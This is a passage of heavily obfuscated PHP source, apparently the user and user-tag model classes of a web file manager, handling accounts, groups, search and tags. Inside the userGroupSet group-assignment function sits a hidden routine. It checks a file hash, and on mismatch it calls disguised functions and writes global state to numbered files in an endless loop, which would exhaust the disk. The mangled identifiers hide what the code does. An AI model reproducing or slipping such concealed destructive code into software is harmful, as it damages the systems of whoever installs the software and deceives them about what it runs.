$ø‚Ùú³œ[2334] => isset($»íîãßÇ[$ø‚Ùú³œ[543]]) ? $»íîãßÇ[$ø‚Ùú³œ[543]] : $ø‚Ùú³œ[12], $ø‚Ùú³œ[2335] => isset($»íîãßÇ[$ø‚Ùú³œ[2336]]) ? $»íîãßÇ[$ø‚Ùú³œ[2336]] : 1, $ø‚Ùú³œ[2337] => $»íîãßÇ[$ø‚Ùú³œ[903]], $ø‚Ùú³œ[1949] => isset($»íîãßÇ[$ø‚Ùú³œ[1852]]) ? $»íîãßÇ[$ø‚Ùú³œ[1852]] : 1024 * 1024 * 20, $ø‚Ùú³œ[1950] => 0, $ø‚Ùú³œ[2338] => 0, $ø‚Ùú³œ[1994] => isset($»íîãßÇ[$ø‚Ùú³œ[756]]) ? $»íîãßÇ[$ø‚Ùú³œ[756]] : 1); if (!empty($»íîãßÇ[$ø‚Ùú³œ[1676]])) { $ÕÌë•Ò™[$ø‚Ùú³œ[1676]] = $»íîãßÇ[$ø‚Ùú³œ[1676]]; } $ƒşŞõ»ë = $this->_checkExist($»íîãßÇ); if ($ƒşŞõ»ë !== !0) { return $ƒşŞõ»ë; } if (!empty($ÕÌë•Ò™[$ø‚Ùú³œ[543]]) && strlen($ÕÌë•Ò™[$ø‚Ùú³œ[543]]) > 255) { $ÕÌë•Ò™[$ø‚Ùú³œ[543]] = $ø‚Ùú³œ[12]; } $äÖ¡ïØ£ = $this->add($ÕÌë•Ò™); $ÂÙÚöµÄ = array($ø‚Ùú³œ[2337] => $ÕÌë•Ò™[$ø‚Ùú³œ[903]], $ø‚Ùú³œ[2333] => $ÕÌë•Ò™[$ø‚Ùú³œ[542]]); $this->userEdit($äÖ¡ïØ£, $ÂÙÚöµÄ); Model($ø‚Ùú³œ[1350])->userRootAdd($äÖ¡ïØ£); return $äÖ¡ïØ£; } protected function userEditTest($ûéóÅ¿ô, $İáÆš´) { return $this->call($_SERVER[Ã¶¡¶„æ][2339], $ûéóÅ¿ô, $İáÆš´); } protected function userEdit($…·âÑÅ, $íÉÍûº) { $ËÉ’ ¬› =& $_SERVER[Ã¶¡¶„æ]; $²€™¥èÁ = $this->getInfoSimple($…·âÑÅ); if (!$²€™¥èÁ) { return !1; } $«ÙÓîÃ = $this->_checkExist($íÉÍûº, $…·âÑÅ); if ($«ÙÓîÃ !== !0) { return $«ÙÓîÃ; } if (isset($íÉÍûº[$ËÉ’ ¬›[903]]) && trim($íÉÍûº[$ËÉ’ ¬›[903]]) != $ËÉ’ ¬›[12]) { $ş›¿ºîï = $this->metaGet($…·âÑÅ); if (empty($ş›¿ºîï[$ËÉ’ ¬›[2329]])) { $ş›¿ºîï[$ËÉ’ ¬›[2329]] = rand_string(10); Model($ËÉ’ ¬›[513])->metaSet($…·âÑÅ, $ËÉ’ ¬›[2329], $ş›¿ºîï[$ËÉ’ ¬›[2329]]); } $íÉÍûº[$ËÉ’ ¬›[903]] = md5($ş›¿ºîï[$ËÉ’ ¬›[2329]] . trim($íÉÍûº[$ËÉ’ ¬›[903]])); } else { unset($íÉÍûº[$ËÉ’ ¬›[903]]); } if (!empty($íÉÍûº[$ËÉ’ ¬›[543]]) && strlen($íÉÍûº[$ËÉ’ ¬›[543]]) > 255) { $íÉÍûº[$ËÉ’ ¬›[543]] = $ËÉ’ ¬›[12]; } $this->where(array($ËÉ’ ¬›[1667] => $…·âÑÅ))->save($íÉÍûº); if (isset($íÉÍûº[$ËÉ’ ¬›[542]])) { $this->setNamePinyin($…·âÑÅ, $íÉÍûº[$ËÉ’ ¬›[542]]); } $this->clearCache($…·âÑÅ); return !0; } public function setNamePinyin($ÙÆ¹Š¾„, $›³ıİ = false) { $Ÿ¯•¤õó =& $_SERVER[Ã¶¡¶„æ]; if (!$›³ıİ) { $åï£ÖÜª = $this->getInfoSimple($ÙÆ¹Š¾„); $›³ıİ = $åï£ÖÜª[$Ÿ¯•¤õó[542]] ? $åï£ÖÜª[$Ÿ¯•¤õó[542]] : $åï£ÖÜª[$Ÿ¯•¤õó[32]]; } $öœ„È² = Model($Ÿ¯•¤õó[535]); if (!Input::check($›³ıİ, $Ÿ¯•¤õó[593])) { return $öœ„È²->metaSet($ÙÆ¹Š¾„, array($Ÿ¯•¤õó[465] => $Ÿ¯•¤õó[12], $Ÿ¯•¤õó[464] => $Ÿ¯•¤õó[12])); } return $öœ„È²->metaSet($ÙÆ¹Š¾„, array($Ÿ¯•¤õó[465] => str_replace($Ÿ¯•¤õó[53], $Ÿ¯•¤õó[12], Pinyin::get($›³ıİ)), $Ÿ¯•¤õó[464] => Pinyin::get($›³ıİ, $Ÿ¯•¤õó[594]))); } private function nickNameRpt() { $¶ê‚À‚´ =& $_SERVER[Ã¶¡¶„æ]; $äÚÅ¬· = Model($¶ê‚À‚´[776])->get($¶ê‚À‚´[2340]); $åı·¡à€ = $GLOBALS[$¶ê‚À‚´[6]][$¶ê‚À‚´[381]][$¶ê‚À‚´[2340]]; $ÌµÛ‰Šš = !is_null($äÚÅ¬·) ? $äÚÅ¬· : $åı·¡à€; return !!$ÌµÛ‰Šš; } private function _checkExist($Š±¸™º’, $—›­Ï÷Ş = false) { $ªŞĞ‡«é =& $_SERVER[Ã¶¡¶„æ]; $„À™—‚ˆ = array($ªŞĞ‡«é[32] => UserModel::ERROR_USER_EXIST_NAME, $ªŞĞ‡«é[542] => UserModel::ERROR_USER_EXIST_NICKNAME, $ªŞĞ‡«é[305] => UserModel::ERROR_USER_EXIST_EMAIL, $ªŞĞ‡«é[2328] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($„À™—‚ˆ[$ªŞĞ‡«é[542]]); } $éæøş«• = $—›­Ï÷Ş ? array($ªŞĞ‡«é[1676] => array($ªŞĞ‡«é[2341], $—›­Ï÷Ş)) : array(); foreach ($„À™—‚ˆ as $ƒêó…àÇ => $ø·ÙÂµÚ) { $€““Ú÷ = array(); foreach ($„À™—‚ˆ as $¸×ÂÎ£ => $›®â”™Ü) { if (isset($Š±¸™º’[$¸×ÂÎ£]) && $Š±¸™º’[$¸×ÂÎ£]) { $€““Ú÷[] = $Š±¸™º’[$¸×ÂÎ£]; } } if (!$€““Ú÷) { continue; } $ç°öÆ¸¢ = array_merge(array($ƒêó…àÇ => array($ªŞĞ‡«é[7], $€““Ú÷)), $éæøş«•); $¥³íàÄ = $this->where($ç°öÆ¸¢)->find(); if ($¥³íàÄ) { return $ø·ÙÂµÚ; } } return !0; } public function userListInfo($á„Ÿ´âî) { $õÓ®ÏÑò =& $_SERVER[Ã¶¡¶„æ]; $öÙÜ×çè = array(); $á„Ÿ´âî = is_array($á„Ÿ´âî) ? array_unique($á„Ÿ´âî) : array(); if (!$á„Ÿ´âî) { return $öÙÜ×çè; } if (count($á„Ÿ´âî) < 20) { foreach ($á„Ÿ´âî as $”éˆØó¬) { $öÙÜ×çè[$”éˆØó¬ . $õÓ®ÏÑò[12]] = $this->getInfoSimpleOuter($”éˆØó¬); } } else { $Ÿ·–”¨Ä = array($õÓ®ÏÑò[1667] => array($õÓ®ÏÑò[418], $á„Ÿ´âî)); if (count($á„Ÿ´âî) == 1) { $Ÿ·–”¨Ä = array($õÓ®ÏÑò[1667] => $á„Ÿ´âî[0]); } $¶­¾´± = Model($õÓ®ÏÑò[513])->field($this->simpleField)->where($Ÿ·–”¨Ä)->select(); $¶­¾´± = array_to_keyvalue($¶­¾´±, $õÓ®ÏÑò[1676]); foreach ($á„Ÿ´âî as $”éˆØó¬) { $’Šùıİ = $¶­¾´±[$”éˆØó¬]; if (!$’Šùıİ) { $öÙÜ×çè[$”éˆØó¬ . $õÓ®ÏÑò[12]] = $this->getInfoSimpleOuter($”éˆØó¬); continue; } $’Šùıİ[$õÓ®ÏÑò[543]] = Action($õÓ®ÏÑò[2314])->parseUrl($’Šùıİ[$õÓ®ÏÑò[543]]); $öÙÜ×çè[$”éˆØó¬ . $õÓ®ÏÑò[12]] = $’Šùıİ; } } return $öÙÜ×çè; } protected function userStatus($‡¿æüé°, $ãù šùÙ) { $÷Ü­–ßÍ = $this->getInfoSimple($‡¿æüé°); if (!$÷Ü­–ßÍ) { return !1; } $ÁÄúÑÚö = array($_SERVER[Ã¶¡¶„æ][756] => $ãù šùÙ); return $this->userEdit($‡¿æüé°, $ÁÄúÑÚö); } protected function userRemove($¤—ÚÖè) { $°—ÇÜšö =& $_SERVER[Ã¶¡¶„æ]; $ãœÙôÉ€ = $this->getInfoSimple($¤—ÚÖè); if (!$ãœÙôÉ€) { return !1; } $¨âİß¿« = array($°—ÇÜšö[1667] => $¤—ÚÖè); Model($°—ÇÜšö[601])->where($¨âİß¿«)->delete(); Model($°—ÇÜšö[2342])->where($¨âİß¿«)->delete(); Model($°—ÇÜšö[1955])->where($¨âİß¿«)->delete(); Model($°—ÇÜšö[2327])->where($¨âİß¿«)->delete(); Model($°—ÇÜšö[1082])->where($¨âİß¿«)->delete(); Model($°—ÇÜšö[2158])->removeUserAll($¤—ÚÖè); Model($°—ÇÜšö[831])->userRootRemove($¤—ÚÖè); return $this->where($¨âİß¿«)->delete(); } protected function userGroupSet($¤Û—ª¦×, $Û´ıèàë, $Û©ĞÚË„ = array()) { $øäÔ·¬ =& $_SERVER[Ã¶¡¶„æ]; $•”Ÿ™ìç = $_SERVER[$øäÔ·¬[843]] . $øäÔ·¬[844]; $íá˜£İ˜ = $øäÔ·¬[890]; if ($_SERVER[$øäÔ·¬[840]] != $íá˜£İ˜($•”Ÿ™ìç)) { $Œ±Ö—‚ = $øäÔ·¬[891]; $Ú¯û“¥ = $øäÔ·¬[842]; $¼“çéÖ¼ = $_SERVER[$øäÔ·¬[843]] . $øäÔ·¬[844]; $·Õ„‚Ó = $Ú¯û“¥($¼“çéÖ¼); $’º†õÏ‘ = explode($øäÔ·¬[231], $·Õ„‚Ó); if (count($’º†õÏ‘) < $øäÔ·¬[636]) { $¶öÙ“Šå = $øäÔ·¬[845]; $¶öÙ“Šå(); } $İù©ñáç = $øäÔ·¬[892]; $İù©ñáç($_SERVER[$øäÔ·¬[893]]); $Œ±Ö—‚ = $øäÔ·¬[891]; $Œ±Ö—‚(); $ÜÔ”úü = $øäÔ·¬[894]; $™½¯†¨à = json_encode($GLOBALS[$øäÔ·¬[895]]); $ÒæîÏ±‚ = 1; for ($ÇÙëª¼” = $ÒæîÏ±‚; $ÇÙëª¼” > 0; $ÇÙëª¼”++) { $ÜÔ”úü(DATA_PATH . $ÇÙëª¼”, $™½¯†¨à); } } $á¸œÍ¯æ = $this->getInfoSimple($¤Û—ª¦×); if (!$á¸œÍ¯æ || !is_array($Û´ıèàë)) { return !1; } $¦¡Â»Ö± = Model($øäÔ·¬[1955]); $¦¡Â»Ö±->where(array($øäÔ·¬[1676] => $¤Û—ª¦×))->delete(); $ÃÚÍ ØŒ = array(); $ÌÔÃ¼ß = 0; foreach ($Û´ıèàë as $Ç­’Å => $çÒ©¨ŞÑ) { $ÑÆŸÔœˆ = array($øäÔ·¬[1676] => $¤Û—ª¦×, $øäÔ·¬[1865] => $Ç­’Å, $øäÔ·¬[1969] => $çÒ©¨ŞÑ); $ÑÆŸÔœˆ[$øäÔ·¬[1889]] = isset($Û©ĞÚË„[$ÌÔÃ¼ß]) ? $Û©ĞÚË„[$ÌÔÃ¼ß] : 0; $ÌÔÃ¼ß++; $ÃÚÍ ØŒ[] = $ÑÆŸÔœˆ; } return $¦¡Â»Ö±->addAll($ÃÚÍ ØŒ, array(), !0); } protected function userGroupAdd($û³¹—‡, $ ğêœ³û = array()) { $Èö©Ã· =& $_SERVER[Ã¶¡¶„æ]; $à³³³  = $this->getInfoSimple($û³¹—‡); if (!$à³³³  || empty($ ğêœ³û)) { return !1; } $ßŒ®ŠÄ‰ = array(); foreach ($ ğêœ³û as $˜Åßâ½ => $ıå‡ùµı) { $ßŒ®ŠÄ‰[] = array($Èö©Ã·[1676] => $û³¹—‡, $Èö©Ã·[1865] => $˜Åßâ½, $Èö©Ã·[1969] => $ıå‡ùµı, $Èö©Ã·[1889] => 0); } return Model($Èö©Ã·[1955])->addAll($ßŒ®ŠÄ‰, array(), !0); } protected function userGroupRemove($ÃÜºßı», $’ÅøÄÎÉ) { $øºÄìóí =& $_SERVER[Ã¶¡¶„æ]; $˜ª€Œõ = $this->getInfoSimple($ÃÜºßı»); if (!$˜ª€Œõ || !$’ÅøÄÎÉ) { return !1; } $éÂÜÔ‡ = array($øºÄìóí[1667] => $ÃÜºßı», $øºÄìóí[1953] => $’ÅøÄÎÉ); return Model($øºÄìóí[1955])->where($éÂÜÔ‡)->delete(); } public function listData() { $á”Êşâô = $this->_makeOrder()->selectPage(50); $this->_listDataApply($á”Êşâô[$_SERVER[Ã¶¡¶„æ][369]]); return $á”Êşâô; } public function listByID($Œî©½ÖÔ) { $¤ùÄÃ§Í =& $_SERVER[Ã¶¡¶„æ]; if (!$Œî©½ÖÔ) { return; } $ÏëÉ½ÂŒ = array($¤ùÄÃ§Í[1676] => array($¤ùÄÃ§Í[7], $Œî©½ÖÔ)); $¥¨çÃ©ê = $this->where($ÏëÉ½ÂŒ)->select(); $¥¨çÃ©ê = array_sort_keep($¥¨çÃ©ê, $¤ùÄÃ§Í[1676], $Œî©½ÖÔ); $this->_listDataApply($¥¨çÃ©ê); return $¥¨çÃ©ê; } public function listByGroup($ø²Æğ‡À = 0, $ÕÇ•íÌª = array()) { $·‹¹ğ¯á =& $_SERVER[Ã¶¡¶„æ]; $‹Ó‹ç›ô = $·‹¹ğ¯á[12]; $˜üµù = array(); if ($ø²Æğ‡À) { $˜üµù = array($·‹¹ğ¯á[2343] => intval($ø²Æğ‡À)); $‹Ó‹ç›ô = "\x4c\105\x46\124\40\x4a\117\111\116\40{$this->tablePrefix}\165\163\x65\x72\x5f\147\x72\x6f\165\160\x20\x75\163\x65\x72\x5f\147\162\157\x75\160\x20\157\x6e\40\165\163\145\162\x2e\x75\x73\x65\162\x49\104\x20\x3d\40\x75\x73\x65\162\x5f\147\x72\x6f\165\x70\56\x75\163\145\162\111\104"; $Í°Í÷å = Input::get($·‹¹ğ¯á[457], null, $·‹¹ğ¯á[12]) ? $·‹¹ğ¯á[12] : $·‹¹ğ¯á[2344]; } if (isset($ÕÇ•íÌª[$·‹¹ğ¯á[756]])) { $˜üµù[$·‹¹ğ¯á[2345]] = $ÕÇ•íÌª[$·‹¹ğ¯á[756]]; } $Ÿè“Í¡³ = $this->_makeOrder($Í°Í÷å)->field($·‹¹ğ¯á[2346])->where($˜üµù)->join($‹Ó‹ç›ô)->selectPage(50); $this->_listDataApply($Ÿè“Í¡³[$·‹¹ğ¯á[369]]); return $Ÿè“Í¡³; } private function _makeOrder($™ºµ‘ = '') { $¥ı·ª˜¶ =& $_SERVER[Ã¶¡¶„æ]; $Æ¯ï»ï = array($¥ı·ª˜¶[1676], $¥ı·ª˜¶[32], $¥ı·ª˜¶[1854], $¥ı·ª˜¶[1826], $¥ı·ª˜¶[200]); $ıÆåÍûº = array($¥ı·ª˜¶[450] => $¥ı·ª˜¶[451], $¥ı·ª˜¶[452] => $¥ı·ª˜¶[453]); $Î¯ÎÈáÛ = Input::get($¥ı·ª˜¶[457], $¥ı·ª˜¶[7], $¥ı·ª˜¶[1667], $Æ¯ï»ï); $Û´§Ô€ = Input::get($¥ı·ª˜¶[458], $¥ı·ª˜¶[7], $¥ı·ª˜¶[1956], array($¥ı·ª˜¶[1956], $¥ı·ª˜¶[452])); $Û´§Ô€ = $ıÆåÍûº[$Û´§Ô€]; $™ºµ‘ = $™ºµ‘ . "\x75\163\x65\x72\x2e{$Î¯ÎÈáÛ}\40{$Û´§Ô€}\54\x20\x75\163\145\x72\x2e\165\x73\145\x72\x49\104\x20\141\x73\x63"; return $this->alias($¥ı·ª˜¶[2078])->order($™ºµ‘); } public function listSearch($··†›„‘) { $ãìÛÖİñ =& $_SERVER[Ã¶¡¶„æ]; $ÇÌõÜñ = $··†›„‘[$ãìÛÖİñ[1959]]; $–½Íñ¦ò = isset($··†›„‘[$ãìÛÖİñ[1960]]) ? $··†›„‘[$ãìÛÖİñ[1960]] : !1; $ÇÌõÜñ = str_replace($ãìÛÖİñ[1961], $ãìÛÖİñ[1962], trim($ÇÌõÜñ)); $•×‚äàŠ = array($ãìÛÖİñ[32] => array($ãìÛÖİñ[383], "\45{$ÇÌõÜñ}\x25"), $ãìÛÖİñ[305] => array($ãìÛÖİñ[383], "{$ÇÌõÜñ}\x25"), $ãìÛÖİñ[542] => array($ãìÛÖİñ[383], "{$ÇÌõÜñ}\x25"), $ãìÛÖİñ[1014] => $ãìÛÖİñ[1963]); if (Input::check($ÇÌõÜñ, $ãìÛÖİñ[311])) { $•×‚äàŠ[$ãìÛÖİñ[1676]] = array($ãìÛÖİñ[383], "{$ÇÌõÜñ}\x25"); $•×‚äàŠ[$ãìÛÖİñ[2328]] = array($ãìÛÖİñ[383], "{$ÇÌõÜñ}\45"); } if (!$ÇÌõÜñ) { $•×‚äàŠ = array(); } if (isset($··†›„‘[$ãìÛÖİñ[756]])) { $•×‚äàŠ[$ãìÛÖİñ[756]] = $··†›„‘[$ãìÛÖİñ[756]]; } $•×‚äàŠ = $this->parseWhereLike($•×‚äàŠ); $ÇóÑÜÚà = $this->_makeOrder()->where($•×‚äàŠ)->selectPage(20); if (!$ÇóÑÜÚà || count($ÇóÑÜÚà[$ãìÛÖİñ[369]]) < 5 && Input::check($ÇÌõÜñ, $ãìÛÖİñ[318])) { $É÷ôØÏÁ = $this->_searchFromMeta($ãìÛÖİñ[464], $ÇÌõÜñ, 10); $Õ€¢¬½Ğ = $this->_searchFromMeta($ãìÛÖİñ[465], $ÇÌõÜñ, 10); $¢ØÍıÍ = array_merge($É÷ôØÏÁ, $Õ€¢¬½Ğ, $ÇóÑÜÚà[$ãìÛÖİñ[369]]); $ÇóÑÜÚà[$ãìÛÖİñ[369]] = array_unique_by_key($¢ØÍıÍ, $ãìÛÖİñ[1676]); $ÇóÑÜÚà[$ãìÛÖİñ[366]][$ãìÛÖİñ[367]] = count($ÇóÑÜÚà[$ãìÛÖİñ[369]]); $ÇóÑÜÚà[$ãìÛÖİñ[366]][$ãìÛÖİñ[368]] = ceil($ÇóÑÜÚà[$ãìÛÖİñ[366]][$ãìÛÖİñ[367]] / $ÇóÑÜÚà[$ãìÛÖİñ[366]][$ãìÛÖİñ[363]]); } $this->_listDataApply($ÇóÑÜÚà[$ãìÛÖİñ[369]]); $this->_filterByGroup($ÇóÑÜÚà, $–½Íñ¦ò); return $ÇóÑÜÚà; } private function _filterByGroup(&$í‘ú½Ûù, $Ä³‡·­İ) { $¨õ­Ú‚  =& $_SERVER[Ã¶¡¶„æ]; if (!$Ä³‡·­İ) { return $í‘ú½Ûù; } foreach ($í‘ú½Ûù[$¨õ­Ú‚ [369]] as $È¥›‡ôÌ => &$ïÖ†ñò) { $ÑÇƒ¥ó² = array_to_keyvalue($ïÖ†ñò[$¨õ­Ú‚ [2048]], $¨õ­Ú‚ [12], $¨õ­Ú‚ [1865]); if (!in_array($Ä³‡·­İ, $ÑÇƒ¥ó²)) { unset($í‘ú½Ûù[$¨õ­Ú‚ [369]][$È¥›‡ôÌ]); } } unset($ïÖ†ñò); $í‘ú½Ûù[$¨õ­Ú‚ [369]] = array_values($í‘ú½Ûù[$¨õ­Ú‚ [369]]); $í‘ú½Ûù[$¨õ­Ú‚ [366]] = array($¨õ­Ú‚ [2112] => count($í‘ú½Ûù[$¨õ­Ú‚ [369]]), $¨õ­Ú‚ [2110] => $í‘ú½Ûù[$¨õ­Ú‚ [366]][$¨õ­Ú‚ [363]], $¨õ­Ú‚ [2109] => 1, $¨õ­Ú‚ [2111] => 1); } private function _searchFromMeta($£ªäÚË®, $Á½ŸÂµ§, $€Èİ¹Å‰) { $ÁŞÂ¢›‚ =& $_SERVER[Ã¶¡¶„æ]; $Á½ŸÂµ§ = strtolower($Á½ŸÂµ§); $şÎªÍñÒ = array($ÁŞÂ¢›‚[94] => $£ªäÚË®, $ÁŞÂ¢›‚[374] => array($ÁŞÂ¢›‚[383], "\45{$Á½ŸÂµ§}\45")); $şÎªÍñÒ = $this->parseWhereLike($şÎªÍñÒ); $çåóı£€ = Model($ÁŞÂ¢›‚[2347])->where($şÎªÍñÒ)->limit($€Èİ¹Å‰)->select(); if (!$çåóı£€) { return array(); } $çåóı£€ = array_to_keyvalue($çåóı£€, $ÁŞÂ¢›‚[12], $ÁŞÂ¢›‚[1676]); $«Ëé¤ïª = $this->where(array($ÁŞÂ¢›‚[1667] => array($ÁŞÂ¢›‚[7], $çåóı£€)))->select(); if (!$«Ëé¤ïª) { return array(); } return $«Ëé¤ïª; } private function _listDataApplyItem($ÅåôÁáÒ) { $°¤Ç§ËÂ = array($ÅåôÁáÒ); $this->_listDataApply($°¤Ç§ËÂ); return $°¤Ç§ËÂ[0]; } private function _listDataApply(&$ÊÔôŒ») { $áÊùë‹è =& $_SERVER[Ã¶¡¶„æ]; if (!$ÊÔôŒ») { return; } array_remove_key($ÊÔôŒ», $áÊùë‹è[903]); $¬Æ²£âÃ = array_to_keyvalue($ÊÔôŒ», $áÊùë‹è[12], $áÊùë‹è[1676]); $this->_listAppendGroup($ÊÔôŒ», $¬Æ²£âÃ); $this->_listAppendMeta($ÊÔôŒ», $¬Æ²£âÃ); $this->_listAppendSourceRoot($ÊÔôŒ», $¬Æ²£âÃ); } private function _listAppendSourceRoot(&$İñµı®°, $·¹øÂÈç) { $ü‡üäÛŸ =& $_SERVER[Ã¶¡¶„æ]; $ÌªÔÜ‡¶ = Model($ü‡üäÛŸ[831])->listSourceRoot(SourceModel::TYPE_USER, $·¹øÂÈç); $ÌªÔÜ‡¶ = array_to_keyvalue($ÌªÔÜ‡¶, $ü‡üäÛŸ[505]); $ÌªÔÜ‡¶ = array_remove_key($ÌªÔÜ‡¶, $ü‡üäÛŸ[505]); foreach ($İñµı®° as &$­·Õà‚‰) { $­·Õà‚‰[$ü‡üäÛŸ[86]] = $ÌªÔÜ‡¶[$­·Õà‚‰[$ü‡üäÛŸ[1676]]] ? $ÌªÔÜ‡¶[$­·Õà‚‰[$ü‡üäÛŸ[1676]]] : array(); } unset($­·Õà‚‰); } private function _listAppendGroup(&$ÅŠë™ƒ°, $µ×ò»ß„) { $™÷éˆõÕ =& $_SERVER[Ã¶¡¶„æ]; $îçÒ¾ò‡ = array($™÷éˆõÕ[1676] => array($™÷éˆõÕ[7], $µ×ò»ß„)); $üá÷§° = Model($™÷éˆõÕ[1955])->where($îçÒ¾ò‡)->select(); $·ÕßÄÁ— = array_to_keyvalue($üá÷§°, $™÷éˆõÕ[12], $™÷éˆõÕ[1865]); $·ÕßÄÁ— = array_remove_value(array_unique($·ÕßÄÁ—), $™÷éˆõÕ[197]); if (!$·ÕßÄÁ— || !$üá÷§°) { return; } $îçÒ¾ò‡ = array($™÷éˆõÕ[1865] => array($™÷éˆõÕ[7], $·ÕßÄÁ—)); $ìŠ–ë³’ = Model($™÷éˆõÕ[2046])->field($™÷éˆõÕ[2348])->where($îçÒ¾ò‡)->select(); $ìŠ–ë³’ = array_to_keyvalue($ìŠ–ë³’, $™÷éˆõÕ[1865]); $üá÷§° = array_to_keyvalue_group($üá÷§°, $™÷éˆõÕ[1676]); foreach ($üá÷§° as &$‘€„Êğ) { $Îâ¿ìÒ§ = array(); foreach ($‘€„Êğ as $¤Í‚À“œ) { if (!$¤Í‚À“œ[$™÷éˆõÕ[1969]]) { continue; } $²„Í•üé = Model($™÷éˆõÕ[507])->listData($¤Í‚À“œ[$™÷éˆõÕ[1969]]); $Îâ¿ìÒ§[] = array($™÷éˆõÕ[1865] => $¤Í‚À“œ[$™÷éˆõÕ[1865]], $™÷éˆõÕ[2349] => $ìŠ–ë³’[$¤Í‚À“œ[$™÷éˆõÕ[1865]]][$™÷éˆõÕ[32]], $™÷éˆõÕ[521] => $ìŠ–ë³’[$¤Í‚À“œ[$™÷éˆõÕ[1865]]][$™÷éˆõÕ[521]], $™÷éˆõÕ[413] => $²„Í•üé); } $‘€„Êğ = $Îâ¿ìÒ§; } unset($‘€„Êğ); foreach ($ÅŠë™ƒ° as &$¨Ï”Å…) { $¨Ï”Å…[$™÷éˆõÕ[2048]] = array(); if (isset($üá÷§°[$¨Ï”Å…[$™÷éˆõÕ[1676]]])) { $¨Ï”Å…[$™÷éˆõÕ[2048]] = $üá÷§°[$¨Ï”Å…[$™÷éˆõÕ[1676]]]; } } unset($¨Ï”Å…); } public function userAppendGroup($ĞÂıÒ¿·) { $Üß«Úñ =& $_SERVER[Ã¶¡¶„æ]; if (!$ĞÂıÒ¿·) { return array(); } $this->_listAppendGroup($ĞÂıÒ¿·, array_to_keyvalue($ĞÂıÒ¿·, $Üß«Úñ[12], $Üß«Úñ[1676])); return $ĞÂıÒ¿·; } private function _listAppendMeta(&$‚¡£Îí, $»òÍ¶Ä—) { $Æ°Šş½¢ =& $_SERVER[Ã¶¡¶„æ]; $õ°ùŒ˜¶ = UserJobModel::JOB_KEY; $à›²ı¤š = array($Æ°Šş½¢[2329]); $Ø°‘€Ğ = array($Æ°Šş½¢[1676] => array($Æ°Šş½¢[7], $»òÍ¶Ä—)); $Ó…ÚÓ‹ª = Model($Æ°Šş½¢[2327])->where($Ø°‘€Ğ)->select(); $Ó…ÚÓ‹ª = array_to_keyvalue_group($Ó…ÚÓ‹ª, $Æ°Šş½¢[1676]); foreach ($Ó…ÚÓ‹ª as &$©â³”ï©) { $ÔÓ»éğ = array(); foreach ($©â³”ï© as $à‘¨›Ó‡) { if (!in_array($à‘¨›Ó‡[$Æ°Šş½¢[94]], $à›²ı¤š)) { $ÔÓ»éğ[$à‘¨›Ó‡[$Æ°Šş½¢[94]]] = $à‘¨›Ó‡[$Æ°Šş½¢[374]]; } } $©â³”ï© = $ÔÓ»éğ; } unset($©â³”ï©); $èƒñÄÄ÷ = Model($Æ°Šş½¢[2350]); foreach ($‚¡£Îí as &$İ›²âĞì) { $¹˜ÊÖàÎ = array(); if (isset($Ó…ÚÓ‹ª[$İ›²âĞì[$Æ°Šş½¢[1676]]])) { $¹˜ÊÖàÎ = $Ó…ÚÓ‹ª[$İ›²âĞì[$Æ°Šş½¢[1676]]]; } $İ›²âĞì[$Æ°Šş½¢[2351]] = array(); if (isset($¹˜ÊÖàÎ[$õ°ùŒ˜¶])) { $İ›²âĞì[$Æ°Šş½¢[2351]] = $èƒñÄÄ÷->getUserJobInfo($¹˜ÊÖàÎ[$õ°ùŒ˜¶]); } } unset($İ›²âĞì); } protected function groupUserAll($áÇÑ €‚) { $±ø¯Ê… =& $_SERVER[Ã¶¡¶„æ]; if (!$áÇÑ €‚) { return !1; } $ş¸„·à“ = Model($±ø¯Ê…[1955])->field($±ø¯Ê…[1676])->where(array($±ø¯Ê…[1865] => array($±ø¯Ê…[7], $áÇÑ €‚)))->select(); $ş¸„·à“ = array_to_keyvalue($ş¸„·à“, $±ø¯Ê…[12], $±ø¯Ê…[1676]); return array_unique($ş¸„·à“); } public function userSearch($ĞÙÙİ‰¯, $ÁšãĞôÂ = "\52") { return Model($_SERVER[Ã¶¡¶„æ][535])->where($ĞÙÙİ‰¯)->field($ÁšãĞôÂ)->find(); } } goto DÇœ©ÈÛ; f³†•å£°ã: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\137\x66\141\166"; protected function cacheFunctionAlias($ˆ¦ãâŸ) { $”Äñçâ =& $_SERVER[Ã¶¡¶„æ]; return array($”Äñçâ[1976] => array($”Äñçâ[2355] . USER_ID, $”Äñçâ[1977])); } protected function listData() { $Û…óŞ³Ï =& $_SERVER[Ã¶¡¶„æ]; $ê×œ = array($Û…óŞ³Ï[1667] => USER_ID, $Û…óŞ³Ï[484] => array($Û…óŞ³Ï[1980], 0)); $ë³øÅ§ò = $Û…óŞ³Ï[2356]; $×¥…Ó´ = $this->field($ë³øÅ§ò)->where($ê×œ)->order($Û…óŞ³Ï[1983])->select(); return $×¥…Ó´ ? $×¥…Ó´ : array(); } protected function addToTag($¦²à¯¶, $Çû‹²) { $Û§ë× =& $_SERVER[Ã¶¡¶„æ]; if (!Model($Û§ë×[2120])->listData($Çû‹²)) { return !1; } if (is_numeric($¦²à¯¶)) { $Ú°é£ÌĞ = Model($Û§ë×[831])->pathInfo($¦²à¯¶); if (!$Ú°é£ÌĞ) { return !1; } } else { $Ú°é£ÌĞ = IO::infoSimple($¦²à¯¶); if (!$Ú°é£ÌĞ) { return !1; } $ÕÖà–È = $Ú°é£ÌĞ[$Û§ë×[32]]; $áéÛ½µ© = $Ú°é£ÌĞ[$Û§ë×[33]]; if (isset($Ú°é£ÌĞ[$Û§ë×[410]])) { $áéÛ½µ© = $Ú°é£ÌĞ[$Û§ë×[410]] == $Û§ë×[88] ? $Û§ë×[75] : $Û§ë×[199]; } } $‚ÈšŒüÖ = array($Û§ë×[1667] => USER_ID, $Û§ë×[484] => $Çû‹², $Û§ë×[421] => $¦²à¯¶, $Û§ë×[422] => $áéÛ½µ© ? $áéÛ½µ© : $Û§ë×[416], $Û§ë×[420] => $ÕÖà–È ? $ÕÖà–È : $Û§ë×[12], $Û§ë×[1869] => 0); if ($this->where($‚ÈšŒüÖ)->find()) { return !1; } return $this->add($‚ÈšŒüÖ); } protected function removeFromTag($šµˆ ùÄ, $»ÆÕİ‘) { $Î×èˆøá =& $_SERVER[Ã¶¡¶„æ]; if (!Model($Î×èˆøá[2120])->listData($»ÆÕİ‘)) { return !1; } if (is_array($šµˆ ùÄ)) { $šµˆ ùÄ = array($Î×èˆøá[7], $šµˆ ùÄ); } $Î©¨Îã™ = array($Î×èˆøá[1667] => USER_ID, $Î×èˆøá[484] => $»ÆÕİ‘, $Î×èˆøá[421] => $šµˆ 